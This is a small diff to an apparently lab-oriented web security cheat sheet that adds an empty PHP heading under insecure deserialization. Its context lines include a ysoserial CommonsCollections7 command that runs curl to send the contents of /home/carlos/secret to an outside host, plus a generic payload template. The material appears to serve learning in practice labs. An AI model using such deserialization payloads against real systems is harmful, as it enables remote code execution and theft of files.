@@ -16,6 +16,7 @@
   * [SQLite](#sqlite)
 * [Insecure Deserialization Section](#insecure-deserialization-section)
   * [Java](#java)
+  * [PHP](#php)
 ## Useful Burp extensions (some of them requires burpsuite pro)
 - Hackvertor
 - Copy As Python-Requests
@@ -116,3 +117,6 @@ java -jar ysoseriar.jar CommonsCollections7 'curl -d @/home/carlos/secret k3of2u
 java -jar ysoseriar.jar <PAYLOAD> 'COMMAND' | encoding
 ```
 For more information about payloads and stuff you can find in the ysoserial [official repository](https://github.com/frohoff/ysoserial)
+
+### PHP
+
